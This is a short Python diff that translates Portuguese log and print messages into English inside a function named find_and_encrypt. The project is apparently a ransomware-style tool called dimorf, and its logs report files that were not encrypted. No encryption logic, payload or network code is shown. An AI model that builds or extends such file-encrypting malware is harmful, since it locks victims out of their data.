@@ -251,8 +251,8 @@ def find_and_encrypt(
                             # # that could not be assigned permission.
                             sleep(2)
                             logs = [
-                                ('Erro ao alterar permissões de arquivo.\n'),
-                                (f'Arquivos => {os.path.join(root, file)}\n')
+                                ('Error changing file permissions\n'),
+                                (f'Files not encrypted by unauthorized operations. => {os.path.join(root, file)}\n')
                             ]
 
                             with open('log_dimorf.log', mode='w') as lf:
@@ -266,7 +266,7 @@ def find_and_encrypt(
                                             1
                                         ]
                                     )
-                                    print(f'\33[32mLogs gerado em {lf}\33[0m')
+                                    print(f'\33[32mLogs generated in -> {lf}\33[0m')
                             
 if __name__ == '__main__':
     os.system('clear')        
